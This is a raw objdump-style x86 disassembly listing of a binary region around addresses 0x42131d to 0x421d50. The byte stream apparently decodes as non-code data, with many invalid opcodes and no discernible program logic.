  42131d:	test   BYTE PTR [ebp+0x5e],0xc8
  421321:	fdivr  st(4),st
  421323:	dec    esp
  421324:	mov    ecx,edx
  421326:	call   0x1e20c8ca
  42132b:	dec    ecx
  42132c:	mov    ds:0x5615ebc4,al
  421331:	jo     0x4212c1
  421333:	mov    BYTE PTR [ecx],cl
	...
  421395:	add    dh,bh
  421397:	(bad)  
  421398:	pop    esp
  421399:	mov    eax,ds:0xdfffbb7d
  42139e:	mov    eax,ds:0x2c6c04b0
  4213a3:	and    al,0xa8
  4213a5:	xchg   edi,ecx
  4213a7:	pusha  
  4213a8:	add    DWORD PTR [eax],eax
  4213aa:	pop    es
  4213ab:	add    DWORD PTR [eax],eax
  4213ad:	add    BYTE PTR [edx+0x6ec1b37e],ah
  4213b3:	mov    ds:0x6171ca7,al
  4213b8:	mov    al,0x17
  4213ba:	mov    ah,0x6d
  4213bc:	cld    
  4213bd:	je     0x4213da
  4213bf:	mov    eax,0xf0e8fd97
  4213c4:	fs mov dh,0xa1
  4213c7:	sbb    bl,BYTE PTR [ecx]
  4213c9:	push   esp
  4213ca:	adc    al,0x2
  4213cc:	test   BYTE PTR [edx+0x26],dl
  4213cf:	nop
  4213d0:	ins    DWORD PTR es:[edi],dx
  4213d1:	mov    BYTE PTR [eax+eiz*4+0x4],al
  4213d5:	jp     0x4213a7
  4213d7:	aad    0xb4
  4213d9:	(bad)  
  4213da:	jp     0x4213c4
  4213dc:	jno    0x421397
  4213de:	jno    0x421393
  4213e0:	sar    esi,1
  4213e2:	mov    ebp,0xf38b0068
  4213e7:	pop    ds
  4213e8:	je     0x421382
  4213ea:	or     DWORD PTR [edi],0x97216faf
  4213f0:	iret   
  4213f1:	xor    bl,ch
  4213f3:	cs cwde 
  4213f5:	sub    cl,BYTE PTR [ebx+0x108cfb26]
  4213fb:	adc    al,0x79
  4213fd:	pop    ebx
  4213fe:	addr16 shl esp,1
  421401:	inc    ecx
  421402:	xor    BYTE PTR ds:0xcd1f1cb,0x5
  421409:	popf   
  42140a:	mov    DWORD PTR [ebx+ebp*2-0x3],edi
  42140e:	fdivr  st,st(6)
  421410:	nop
  421411:	loope  0x421444
  421413:	or     al,0x20
  421415:	xchg   esp,esp
  421417:	adc    al,0x37
  421419:	sub    DWORD PTR [eax+0x15],ebp
  42141c:	xor    bh,BYTE PTR [ecx]
  42141e:	sti    
  42141f:	push   esi
  421420:	loope  0x4213c0
  421422:	sub    eax,0x3e70bfe
  421427:	jbe    0x4213d1
  421429:	and    al,0x1d
  42142b:	jae    0x421443
  42142d:	frstor [edi-0x17]
  421430:	dec    esp
  421431:	(bad)  
  421432:	mov    edx,0x5bc71433
  421437:	sub    eax,0xcbe901c3
  42143c:	jp     0x42146e
  42143e:	mov    edx,0x1836b321
  421443:	in     eax,0x5
  421445:	fldcw  WORD PTR [ecx-0x35f15d7f]
  42144b:	into   
  42144c:	je     0x421493
  42144e:	push   esi
  42144f:	sbb    eax,0x78490ff2
  421454:	lock xchg BYTE PTR [ecx+0x4d8af9b5],ah
  42145b:	pop    ebx
  42145c:	add    BYTE PTR [edi],al
  42145e:	sbb    dh,ah
  421460:	int3   
  421461:	push   es
  421462:	or     al,0xea
  421464:	bound  ecx,QWORD PTR [edi+0x17]
  421467:	hlt    
  421468:	push   ebx
  421469:	push   esi
  42146a:	das    
  42146b:	imul   esp,DWORD PTR [ebx-0x34],0xfffffff8
  42146f:	shl    dh,0xad
  421472:	test   al,0xa3
  421474:	in     eax,dx
  421475:	test   DWORD PTR [ebp+0x6d2edc60],esi
  42147b:	push   ebp
  42147c:	out    dx,al
  42147d:	jmp    FWORD PTR [edx+0x33c828b3]
  421483:	sub    dl,dh
  421485:	pop    ds
  421486:	or     DWORD PTR [edi],0x2941b875
  42148c:	gs cwde 
  42148e:	mov    edx,0x5a8c2568
  421493:	and    ah,ch
  421495:	sub    DWORD PTR [ecx+0x3c],esi
  421498:	mov    ah,0xfe
  42149a:	ss push es
  42149c:	dec    eax
  42149d:	jp     0x4214a5
  42149f:	xchg   esp,eax
  4214a0:	xchg   ebp,eax
  4214a1:	xor    DWORD PTR [ebx],edi
  4214a3:	ret    
  4214a4:	loope  0x4214b2
  4214a6:	inc    ebp
  4214a7:	stc    
  4214a8:	xor    al,0x2a
  4214aa:	and    ah,BYTE PTR [ebx+0xab98a2a]
  4214b0:	stc    
  4214b1:	in     al,dx
  4214b2:	sbb    cl,BYTE PTR [eax+0x17]
	...
  421514:	add    BYTE PTR [eax],al
  421516:	(bad)  
  421517:	repnz test BYTE PTR [eax],bl
  42151a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42151b:	jle    0x4214fb
  42151d:	(bad)  
  42151e:	stc    
  42151f:	test   DWORD PTR [ecx],edx
  421521:	popa   
  421522:	jo     0x4214e3
  421524:	scas   al,BYTE PTR es:[edi]
  421525:	inc    ebx
  421526:	(bad)  
  421527:	popa   
  421528:	add    DWORD PTR [eax],eax
  42152a:	pop    es
  42152b:	add    DWORD PTR [eax],eax
  42152d:	add    BYTE PTR [ebx],cl
  42152f:	ret    
  421530:	xor    esi,DWORD PTR [esi]
  421532:	imul   ebp,DWORD PTR [ebp-0xf5ae579],0x618c4f3c
  42153c:	aas    
  42153d:	lods   eax,DWORD PTR ds:[esi]
  42153e:	jno    0x4215a9
  421540:	add    DWORD PTR [ebx],0x8b677498
  421546:	cdq    
  421547:	pop    esp
  421548:	xchg   edx,eax
  421549:	(bad)  
  42154a:	in     eax,dx
  42154b:	pop    eax
  42154c:	lods   al,BYTE PTR ds:[esi]
  42154d:	mov    eax,0x1c232cbb
  421552:	test   BYTE PTR [ebp+0x715ddb2a],ah
  421558:	retf   0x7140
  42155b:	lds    ecx,FWORD PTR [edx-0x39]
  42155e:	sahf   
  42155f:	(bad)  
  421560:	jo     0x42151f
  421562:	call   0xe76a:0x8ac230f8
  421569:	jmp    0x4215d7
  42156b:	sub    al,al
  42156d:	fnclex 
  42156f:	imul   eax,DWORD PTR [edx+0x581ba668],0xffffffed
  421576:	shl    BYTE PTR [esi],0x22
  421579:	dec    eax
  42157a:	push   0xc51e610b
  42157f:	mov    WORD PTR ds:0xb7a33f4d,?
  421585:	jo     0x421593
  421587:	jno    0x42154c
  421589:	push   ds
  42158a:	mov    cl,0x83
  42158c:	sub    bh,dh
  42158e:	mov    ds:0x3d19be3f,al
  421593:	stc    
  421594:	xchg   ebp,eax
  421595:	push   DWORD PTR [eax]
  421597:	cwde   
  421598:	adc    al,0x6d
  42159a:	sub    DWORD PTR [esi],0xffffff88
  42159d:	je     0x42154f
  42159f:	inc    edi
  4215a0:	push   0x52
  4215a2:	adc    DWORD PTR [edi+0x1f],esp
  4215a5:	repnz mov dh,0x64
  4215a8:	push   esp
  4215a9:	add    al,0x2f
  4215ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215ac:	inc    eax
  4215ad:	xchg   ebp,eax
  4215ae:	lods   eax,DWORD PTR ds:[esi]
  4215af:	sub    cl,BYTE PTR [ecx+0x723be892]
  4215b5:	sbb    DWORD PTR [eax*1-0x2e74c8f1],ebp
  4215bc:	xor    eax,0x3ca869ab
  4215c1:	bound  ebp,QWORD PTR [eax+0x418a9e2f]
  4215c7:	pop    esi
  4215c8:	ja     0x421551
  4215ca:	dec    edx
  4215cb:	(bad)  
  4215cc:	aad    0x50
  4215ce:	mov    edi,0x2ef8b2a2
  4215d3:	ins    DWORD PTR es:[edi],dx
  4215d4:	and    edi,edx
  4215d6:	adc    dl,dh
  4215d8:	ds retf 0xe997
  4215dc:	push   eax
  4215dd:	mov    ds:0xd560d6ed,eax
  4215e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215e3:	clc    
  4215e4:	push   0x9b412f1e
  4215e9:	lods   al,BYTE PTR ds:[esi]
  4215ea:	leave  
  4215eb:	div    BYTE PTR [esi-0x4b]
  4215ee:	fistp  WORD PTR [ecx-0x6c]
  4215f1:	jg     0x4215f5
  4215f3:	leave  
  4215f4:	adc    eax,0xcb79e9d7
  4215f9:	fucomip st,st(4)
  4215fb:	dec    edi
  4215fc:	or     BYTE PTR [edi+0x41],ah
  4215ff:	push   ecx
  421600:	fs adc eax,0x36775e0d
  421606:	gs ret 0xa825
  42160a:	fs xchg esi,eax
  42160c:	cmp    ecx,DWORD PTR [ecx]
  42160e:	ret    0xe30b
  421611:	int3   
  421612:	sub    DWORD PTR [eax-0x7e59b1da],edx
  421618:	mov    esp,0x58d2e2a6
  42161d:	test   eax,0x12eacc56
  421622:	push   edi
  421623:	xor    edx,edi
  421625:	jne    0x4215b7
  421627:	pop    ecx
  421628:	jle    0x42168f
  42162a:	ins    DWORD PTR es:[edi],dx
  42162b:	inc    edi
  42162c:	inc    edx
  42162d:	enter  0xa40,0xb1
  421631:	mov    ah,0xdb
  421633:	mov    al,ds:0x1a
	...
  421694:	add    BYTE PTR [eax],al
  421696:	stos   DWORD PTR es:[edi],eax
  421697:	sub    al,0xed
  421699:	stos   BYTE PTR es:[edi],al
  42169a:	out    dx,eax
  42169b:	jmp    0x42168c
  42169d:	sub    eax,0xf9231b1e
  4216a2:	xor    BYTE PTR [ebx+0xc],0x56
  4216a6:	frstor [edx+0x1]
  4216a9:	add    BYTE PTR [edi],al
  4216ab:	add    DWORD PTR [eax],eax
  4216ad:	add    cl,ah
  4216af:	call   0x0:0xad512230
  4216b6:	cmp    DWORD PTR [edx],edx
  4216b8:	jmp    0xd065:0x3479bd08
  4216bf:	hlt    
  4216c0:	add    al,ah
  4216c2:	sti    
  4216c3:	fwait
  4216c4:	outs   dx,DWORD PTR ds:[esi]
  4216c5:	lods   al,BYTE PTR ds:[esi]
  4216c6:	sub    al,0x3d
  4216c8:	lods   eax,DWORD PTR ds:[esi]
  4216c9:	sub    DWORD PTR [edi],ebp
  4216cb:	or     eax,0xa16f8148
  4216d0:	push   0xffffffe5
  4216d2:	shl    DWORD PTR [edi+0x64],0xd2
  4216d6:	shl    BYTE PTR [esi-0x4a],cl
  4216d9:	xchg   esi,eax
  4216da:	inc    esi
  4216db:	(bad)  
  4216dc:	sbb    eax,ebx
  4216de:	(bad)  
  4216e1:	adc    cl,ch
  4216e3:	(bad)  
  4216e5:	cmp    BYTE PTR [esi],0xe3
  4216e8:	out    dx,eax
  4216e9:	imul   esp
  4216eb:	adc    BYTE PTR [ecx],bh
  4216ed:	mov    BYTE PTR [eax+0x438fedf5],dh
  4216f3:	out    dx,al
  4216f4:	ins    DWORD PTR es:[edi],dx
  4216f5:	push   cs
  4216f6:	jge    0x42175c
  4216f8:	shl    bl,cl
  4216fa:	xor    edi,ebx
  4216fc:	and    DWORD PTR [ecx+0x4b8f373b],0x1bb2cbf1
  421706:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421708:	ins    BYTE PTR es:[edi],dx
  421709:	hlt    
  42170a:	dec    ebp
  42170b:	lods   al,BYTE PTR ds:[esi]
  42170c:	sub    al,0xf9
  42170e:	test   eax,0x32c91f43
  421713:	and    al,0xd5
  421715:	cli    
  421716:	fcomp  QWORD PTR [edx+0x323b01d4]
  42171c:	lea    edx,[esi]
  42171e:	mov    edx,0x7810956b
  421723:	jns    0x421791
  421725:	adc    DWORD PTR [ecx-0x5f260b33],ebp
  42172b:	mov    ?,WORD PTR [esi]
  42172d:	push   esi
  42172e:	test   eax,0x721212da
  421733:	in     al,dx
  421734:	int3   
  421735:	jb     0x421767
  421737:	and    dh,ch
  421739:	data16 aam 0xb1
  42173c:	rcl    bl,cl
  42173e:	mov    bl,0x3d
  421740:	mov    ebx,0x1d76c250
  421745:	xor    BYTE PTR [edi+0x48],0xc2
  421749:	popa   
  42174a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42174b:	pop    edx
  42174c:	or     eax,0xb065ea01
  421751:	adc    al,0x24
  421753:	add    eax,0x5d6823b5
  421758:	xor    eax,0xe0fb6fae
  42175d:	xchg   edi,eax
  42175e:	(bad)  
  42175f:	je     0x4217ac
  421761:	out    0x59,eax
  421763:	inc    eax
  421764:	fisttp DWORD PTR ds:0x93d3d172
  42176a:	adc    BYTE PTR [edi+edi*1+0x1fe28b93],0x66
  421772:	or     BYTE PTR [edx-0x19],0xe
  421776:	cwde   
  421777:	das    
  421778:	scas   al,BYTE PTR es:[edi]
  421779:	jp     0x4217b6
  42177b:	addr16 sbb eax,0x5de39d25
  421781:	xchg   esp,eax
  421782:	dec    ecx
  421783:	cmp    eax,0x187cbb14
  421788:	push   ss
  421789:	hlt    
  42178a:	pop    es
  42178b:	sbb    al,bl
  42178d:	add    al,0x7f
  42178f:	jb     0x4217a7
  421791:	push   edx
  421792:	xor    al,0xfb
  421794:	dec    ebp
  421795:	xchg   edx,eax
  421796:	call   0x34ec07c8
  42179b:	out    dx,eax
  42179c:	sub    DWORD PTR [ebp+0x1a],ebp
  42179f:	mov    eax,0x42d0537b
  4217a4:	aas    
  4217a5:	pop    es
  4217a6:	pop    ebx
  4217a7:	sbb    esp,edi
  4217a9:	mov    ch,0xf1
  4217ab:	std    
  4217ac:	jmp    0x4217bf
  4217ae:	imul   ecx,edi,0xffffff9f
  4217b1:	pop    es
  4217b2:	inc    esi
  4217b3:	push   ecx
  4217b4:	outs   dx,DWORD PTR ds:[esi]
	...
  421815:	add    cl,dl
  421817:	mov    al,ds:0xf9f9e0b9
  42181c:	fnstenv [ecx-0x7ac22162]
  421822:	xor    BYTE PTR [eax+ecx*2],ah
  421825:	mov    ah,ah
  421827:	arpl   WORD PTR [ecx],ax
  421829:	add    BYTE PTR [edi],al
  42182b:	add    DWORD PTR [eax],eax
  42182d:	add    BYTE PTR ds:0xa19c3b6e,cl
  421833:	sbb    BYTE PTR [edx+0x43537238],0x9e
  42183a:	popa   
  42183b:	sub    eax,0x4a690c5b
  421840:	push   ss
  421841:	outs   dx,BYTE PTR ds:[esi]
  421842:	xlat   BYTE PTR ds:[ebx]
  421843:	add    al,0xdd
  421845:	inc    eax
  421846:	inc    esi
  421847:	cld    
  421848:	mov    eax,0x18d93080
  42184d:	pop    ecx
  42184e:	mov    WORD PTR [ebp+0x4f662a5d],?
  421854:	push   edi
  421855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421856:	mov    esi,0x9727e8b7
  42185b:	dec    esp
  42185c:	loopne 0x42181a
  42185e:	pop    ebp
  42185f:	cli    
  421860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421861:	push   0xffffffc9
  421863:	mov    eax,0xf94a1f0
  421868:	xchg   DWORD PTR [ecx-0x7697133f],edi
  42186e:	aaa    
  42186f:	inc    ecx
  421870:	pop    es
  421871:	iret   
  421872:	or     al,0xc8
  421874:	fistp  DWORD PTR [edi]
  421876:	mov    cl,0x1c
  421878:	dec    edx
  421879:	xchg   edi,eax
  42187a:	outs   dx,DWORD PTR ds:[esi]
  42187b:	mov    ebp,0x64da68e2
  421880:	mov    ecx,0xbb2c2434
  421885:	push   0x3ef34566
  42188a:	mov    dl,0x33
  42188c:	dec    esi
  42188d:	in     al,dx
  42188e:	aas    
  42188f:	cmp    al,0x54
  421891:	jp     0x4218b6
  421893:	shr    eax,cl
  421895:	sub    al,0xcc
  421897:	ss scas eax,DWORD PTR es:[edi]
  421899:	sbb    DWORD PTR [ecx-0x1e],ebp
  42189c:	add    al,0xcd
  42189e:	fcom   DWORD PTR [edi-0x27]
  4218a1:	sub    eax,0xc0745cda
  4218a6:	mov    ?,WORD PTR [edx+0x1e]
  4218a9:	retf   
  4218aa:	jno    0x421900
  4218ac:	(bad)  
  4218ae:	ds push es
  4218b0:	in     al,dx
  4218b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218b2:	std    
  4218b3:	adc    ecx,DWORD PTR cs:[edx]
  4218b6:	aam    0xe6
  4218b8:	dec    ecx
  4218b9:	sub    BYTE PTR [edx],0x54
  4218bc:	pushf  
  4218bd:	ror    DWORD PTR [edi+0x1ff0b8bd],0x54
  4218c4:	ss pop esp
  4218c6:	mov    edi,0xd01d75bd
  4218cb:	mov    DWORD PTR [edi],esi
  4218cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218cf:	sbb    al,0xa7
  4218d1:	into   
  4218d2:	scas   al,BYTE PTR es:[edi]
  4218d3:	js     0x4218af
  4218d5:	pop    esi
  4218d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218d7:	or     ebp,esi
  4218d9:	push   edi
  4218da:	imul   ebp,DWORD PTR [ebp*8-0x550d311c],0x2bdb8e53
  4218e5:	mov    dh,0xa3
  4218e7:	(bad)  [ebx+0x5508808]
  4218ed:	adc    BYTE PTR [ebp+0x5a234cfb],ch
  4218f3:	push   eax
  4218f4:	inc    ecx
  4218f5:	fdivr  DWORD PTR [edi+0x7d6ce41b]
  4218fb:	mov    DWORD PTR [ecx-0x70],eax
  4218fe:	aaa    
  4218ff:	cwde   
  421900:	and    DWORD PTR [ebx+0x2f3ea4d8],0x5da266ad
  42190a:	ret    0x3c50
  42190d:	enter  0x4c94,0x82
  421911:	fucompp 
  421913:	imul   ecx,DWORD PTR [eax-0xb655031],0x2c
  42191a:	dec    edx
  42191b:	in     eax,dx
  42191c:	inc    eax
  42191d:	adc    al,cl
  42191f:	xchg   edi,eax
  421920:	fs retf 
  421922:	ins    BYTE PTR es:[edi],dx
  421923:	fldcw  WORD PTR [eax]
  421925:	je     0x421982
  421927:	dec    esp
  421928:	or     BYTE PTR [eax],dh
  42192a:	or     edi,ebx
  42192c:	and    eax,0xc15dec37
  421931:	lahf   
  421932:	outs   dx,BYTE PTR ds:[esi]
  421933:	adc    BYTE PTR [edx+0x0],0x0
	...
  421996:	(bad)  
  421997:	cld    
  421998:	je     0x4219b7
  42199a:	jbe    0x421939
  42199c:	(bad)  
  42199d:	dec    DWORD PTR [ebx-0x3d]
  4219a0:	rcl    DWORD PTR [edx+0x15a310d1],0xeb
  4219a7:	add    DWORD PTR fs:[eax],eax
  4219aa:	pop    es
  4219ab:	add    DWORD PTR [eax],eax
  4219ad:	add    bl,ah
  4219af:	add    BYTE PTR [ebp+0x26a44e0c],dh
  4219b5:	fld    DWORD PTR [edx+ecx*2]
  4219b8:	dec    eax
  4219b9:	or     BYTE PTR [ebp+eax*2+0x26c17a],dh
  4219c0:	push   es
  4219c1:	push   cs
  4219c2:	pop    edi
  4219c3:	icebp  
  4219c4:	jp     0x421986
  4219c6:	in     al,dx
  4219c7:	pushf  
  4219c8:	xor    ah,BYTE PTR [edi]
  4219ca:	cmp    eax,DWORD PTR [ecx-0x6f]
  4219cd:	or     BYTE PTR [esi],al
  4219cf:	add    eax,0x6ae9e690
  4219d4:	mov    ecx,0x526c596c
  4219d9:	bsr    ecx,ebp
  4219dc:	les    ebp,FWORD PTR [ecx]
  4219de:	mov    eax,0xae6db3af
  4219e3:	fstp   QWORD PTR [ebp-0x4c]
  4219e6:	int3   
  4219e7:	sbb    edi,DWORD PTR [esi+0x34]
  4219ea:	jne    0x4219b4
  4219ec:	ret    
  4219ed:	inc    eax
  4219ee:	mov    edi,gs
  4219f0:	aam    0x60
  4219f2:	mov    bh,0xaf
  4219f4:	sub    BYTE PTR [edi+0x233c3ea3],cl
  4219fa:	lds    eax,FWORD PTR [ecx-0x80]
  4219fd:	xor    al,BYTE PTR gs:[edx+0x8]
  421a01:	jmp    0x1587:0x43326e72
  421a08:	popf   
  421a09:	rcr    BYTE PTR ds:0xc1d5243,cl
  421a0f:	shl    DWORD PTR [ebx],0x7a
  421a12:	xchg   esi,edx
  421a14:	pop    ebp
  421a15:	test   eax,0x4fdea5a7
  421a1a:	mov    BYTE PTR [esi],bl
  421a1c:	dec    ebx
  421a1d:	push   esi
  421a1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a1f:	jle    0x421a30
  421a21:	xchg   esi,eax
  421a22:	imul   ecx,DWORD PTR [esi],0xffffffad
  421a25:	in     al,dx
  421a26:	das    
  421a27:	ins    BYTE PTR es:[edi],dx
  421a28:	fs pop esi
  421a2a:	inc    edx
  421a2b:	sub    bh,BYTE PTR [eax+ecx*2-0x1a]
  421a2f:	dec    esp
  421a30:	sbb    al,0x40
  421a32:	call   0x44f58421
  421a37:	jae    0x4219cf
  421a39:	inc    esi
  421a3a:	adc    dh,BYTE PTR [ecx+0x565439d7]
  421a40:	std    
  421a41:	imul   ebx,DWORD PTR [edx-0x6f],0xffffffb7
  421a45:	and    al,0x67
  421a47:	sbb    eax,0xf67f9fcc
  421a4c:	xchg   esi,eax
  421a4d:	mov    eax,ds:0x2d53655f
  421a52:	pop    esp
  421a53:	cld    
  421a54:	out    dx,eax
  421a55:	ins    DWORD PTR es:[edi],dx
  421a56:	(bad)  
  421a57:	nop
  421a58:	pushf  
  421a59:	pop    ecx
  421a5a:	repz mov edx,0x97760fa4
  421a60:	push   cs
  421a61:	adc    dh,bl
  421a63:	xchg   esi,eax
  421a64:	push   cs
  421a65:	icebp  
  421a66:	dec    edi
  421a67:	ret    
  421a68:	jge    0x421ada
  421a6a:	loope  0x4219fe
  421a6c:	or     bh,BYTE PTR [ebx-0x6]
  421a6f:	jmp    0x421aaa
  421a71:	lods   eax,DWORD PTR ds:[esi]
  421a72:	xor    ch,BYTE PTR [esi-0x31713bbd]
  421a78:	jns    0x421a08
  421a7a:	inc    esi
  421a7b:	lea    ebx,[esi]
  421a7d:	daa    
  421a7e:	add    eax,0x56e038db
  421a83:	and    BYTE PTR [ebx-0x2f],dh
  421a86:	pusha  
  421a87:	inc    esp
  421a88:	popf   
  421a89:	inc    ebx
  421a8a:	out    0x98,al
  421a8c:	pop    esi
  421a8d:	iret   
  421a8e:	inc    edi
  421a8f:	or     edx,ecx
  421a91:	lahf   
  421a92:	and    BYTE PTR [ebx-0x5b],0xcb
  421a96:	hlt    
  421a97:	sub    al,0xcf
  421a99:	dec    esp
  421a9a:	cli    
  421a9b:	jmp    0xe8:0xcb2dadc6
  421aa2:	push   es
  421aa3:	lea    ecx,[bp+di-0x2d11]
  421aa8:	push   ax
  421aaa:	test   al,0x17
  421aac:	fldenv [ecx+0x24]
  421aaf:	lds    eax,FWORD PTR [eax]
  421ab1:	inc    esp
  421ab2:	(bad)  
  421ab3:	push   ds
  421ab4:	ins    DWORD PTR es:[edi],dx
	...
  421b15:	add    BYTE PTR [esi],dl
  421b17:	cdq    
  421b18:	jmp    0x37400aea
  421b1d:	fcmovnu st,st(5)
  421b1f:	sahf   
  421b20:	test   DWORD PTR [edx+0x2f7eaca9],0x165f2
  421b2a:	pop    es
  421b2b:	add    DWORD PTR [eax],eax
  421b2d:	add    BYTE PTR [edi+0x46],ah
  421b30:	jmp    0xe093:0x6a12e645
  421b37:	sbb    eax,0x2cf926a9
  421b3c:	dec    esp
  421b3d:	xchg   esp,eax
  421b3e:	mov    WORD PTR [esi-0x1b],gs
  421b41:	call   0x4fde:0x6bd2ac11
  421b48:	ins    BYTE PTR es:[edi],dx
  421b49:	icebp  
  421b4a:	(bad)  
  421b4b:	call   0xdf97:0x1b403424
  421b52:	cmp    al,0x23
  421b54:	jno    0x421b30
  421b56:	xchg   esi,eax
  421b57:	sbb    al,0xe4
  421b59:	dec    esi
  421b5a:	dec    eax
  421b5b:	sub    ch,dl
  421b5d:	ds (bad) 
  421b5f:	dec    ebx
  421b60:	mov    esi,0x83769e3
  421b65:	ins    BYTE PTR es:[edi],dx
  421b66:	in     al,dx
  421b67:	in     eax,dx
  421b68:	mov    al,ds:0xfdb59d56
  421b6d:	rcr    BYTE PTR [ebx+edx*2-0x74],1
  421b71:	test   eax,0xc57ffc2d
  421b76:	sub    edx,DWORD PTR [edx-0x5b]
  421b79:	rcl    BYTE PTR [esi+0x55420f9e],1
  421b7f:	mov    ds:0xcaa89955,eax
  421b84:	mov    bh,0xa0
  421b86:	addr16 push ebp
  421b88:	fcom   DWORD PTR [ebp-0x23]
  421b8b:	xchg   esp,ecx
  421b8d:	cs push edx
  421b8f:	stos   BYTE PTR es:[edi],al
  421b90:	sub    al,0xba
  421b92:	idiv   DWORD PTR ds:0x9c8a5a2f
  421b98:	(bad)  
  421b99:	not    DWORD PTR [esi]
  421b9b:	in     eax,dx
  421b9c:	push   ebp
  421b9d:	push   esp
  421b9e:	jmp    0x8a0b:0x4aa1c364
  421ba5:	out    0x4a,eax
  421ba7:	cwde   
  421ba8:	jnp    0x421bee
  421baa:	push   esi
  421bab:	ret    
  421bac:	push   0x1bdb78c0
  421bb1:	xlat   BYTE PTR ds:[ebx]
  421bb2:	mov    ds:0xb5d23198,al
  421bb7:	pop    esp
  421bb8:	mov    ds:0x5b70ed13,al
  421bbd:	push   ebx
  421bbe:	mov    ch,0x1
  421bc0:	fbld   TBYTE PTR [eax]
  421bc2:	push   esp
  421bc3:	cmp    ebp,ecx
  421bc5:	ins    DWORD PTR es:[edi],dx
  421bc6:	lods   eax,DWORD PTR ds:[esi]
  421bc7:	fsubr  DWORD PTR [esi-0x514c3644]
  421bcd:	in     al,0xcb
  421bcf:	push   ebp
  421bd0:	xlat   BYTE PTR ds:[ebx]
  421bd1:	mov    ?,WORD PTR [eax+0x66]
  421bd4:	ja     0x421b5b
  421bd6:	iret   
  421bd7:	mov    esi,0xee4069fa
  421bdc:	cwde   
  421bdd:	gs mov ecx,0x7c1d246a
  421be3:	leave  
  421be4:	xchg   esi,eax
  421be5:	std    
  421be6:	imul   edi,DWORD PTR [esi-0x5649dd05],0xcb4366d7
  421bf0:	(bad)  
  421bf2:	outs   dx,BYTE PTR ds:[esi]
  421bf3:	call   FWORD PTR [ebx-0x27]
  421bf6:	inc    edi
  421bf7:	lea    esi,[ecx-0x70]
  421bfa:	xchg   esi,eax
  421bfb:	mov    ebx,DWORD PTR [edi]
  421bfd:	popa   
  421bfe:	js     0x421c79
  421c00:	cmp    BYTE PTR [esp+esi*2-0x59],al
  421c04:	mov    ds:0x177caabe,al
  421c09:	imul   esp,DWORD PTR [ecx-0x4f],0x606a5aa6
  421c10:	xchg   edi,eax
  421c11:	test   DWORD PTR [ecx+0x585ab323],edi
  421c17:	and    eax,0xb4aa4872
  421c1c:	pop    esp
  421c1d:	enter  0x8f83,0xc6
  421c21:	addr16 mov al,ds:0x30cc
  421c25:	xchg   esi,eax
  421c26:	cmp    DWORD PTR [ebx],ecx
  421c28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c29:	test   al,0x8c
  421c2b:	mov    ah,0x92
  421c2d:	fistp  WORD PTR [edx]
  421c2f:	inc    esp
  421c30:	xchg   esi,eax
  421c31:	jnp    0x421be5
  421c33:	repz sldt WORD PTR [eax]
	...
  421c93:	add    BYTE PTR [eax],al
  421c95:	add    BYTE PTR [eax-0x1a4a95],dh
  421c9b:	push   eax
  421c9d:	jg     0x421c36
  421c9f:	shl    DWORD PTR [ebp+0x7abe1f19],0xa9
  421ca6:	stc    
  421ca7:	add    WORD PTR [eax],ax
  421caa:	pop    es
  421cab:	add    DWORD PTR [eax],eax
  421cad:	add    dl,ah
  421caf:	push   0x6faf0564
  421cb4:	popa   
  421cb5:	js     0x421d25
  421cb7:	pop    es
  421cb8:	js     0x421ced
  421cba:	hlt    
  421cbb:	lds    esp,FWORD PTR [ebx]
  421cbd:	mov    DWORD PTR [edx-0xe],ebx
  421cc0:	sbb    DWORD PTR [edi-0x43a36556],esp
  421cc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421cc7:	stc    
  421cc8:	jmp    0x421c5a
  421cca:	pop    ds
  421ccb:	jno    0x421cc7
  421ccd:	and    ebp,DWORD PTR [ebx+edx*1+0x1e59d3e7]
  421cd4:	and    dl,ch
  421cd6:	sub    al,0x45
  421cd8:	and    eax,0xace54f06
  421cdd:	leave  
  421cde:	pop    edx
  421cdf:	addr16 and eax,0xf5d593fc
  421ce5:	mov    cl,0x57
  421ce7:	push   cs
  421ce8:	fisubr DWORD PTR [eax]
  421cea:	mov    dh,0x89
  421cec:	out    0x77,eax
  421cee:	scas   eax,DWORD PTR es:[edi]
  421cef:	adc    eax,0x41776f66
  421cf4:	and    edi,DWORD PTR [esp+ebp*8]
  421cf7:	sbb    edi,edi
  421cf9:	push   esp
  421cfa:	ins    BYTE PTR es:[edi],dx
  421cfb:	ds inc ebx
  421cfd:	sbb    eax,0xd529a5b6
  421d02:	pop    es
  421d03:	mov    fs,esi
  421d05:	xchg   ebp,ebp
  421d07:	in     al,dx
  421d08:	xchg   DWORD PTR [ecx-0x51cdb5c5],esi
  421d0e:	sti    
  421d0f:	(bad)  
  421d10:	xor    bl,al
  421d12:	out    0xd8,al
  421d14:	ja     0x421d27
  421d16:	push   0x66c4b907
  421d1b:	fdivr  DWORD PTR [eax-0x1a]
  421d1e:	mov    bh,0xb3
  421d20:	scas   eax,DWORD PTR es:[edi]
  421d21:	pop    DWORD PTR [esi-0x35]
  421d24:	adc    esi,edi
  421d26:	lods   eax,DWORD PTR ds:[esi]
  421d27:	into   
  421d28:	inc    edi
  421d29:	dec    ecx
  421d2a:	stc    
  421d2b:	inc    ecx
  421d2c:	nop    DWORD PTR [esi]
  421d2f:	adc    dh,BYTE PTR [ecx-0x237a19d9]
  421d35:	add    eax,0xf48fa41a
  421d3a:	outs   dx,BYTE PTR ds:[esi]
  421d3b:	(bad)  
  421d3c:	ficom  WORD PTR [ebx]
  421d3e:	mov    ds:0xdf25cd78,eax
  421d43:	ss push edx
  421d45:	or     BYTE PTR [eax+0x477c0db0],dl
  421d4b:	scas   eax,DWORD PTR es:[edi]
  421d4c:	ret    0xf0d0
  421d4f:	ins    BYTE PTR es:[edi],dx
  421d50:	je     0x421d7a
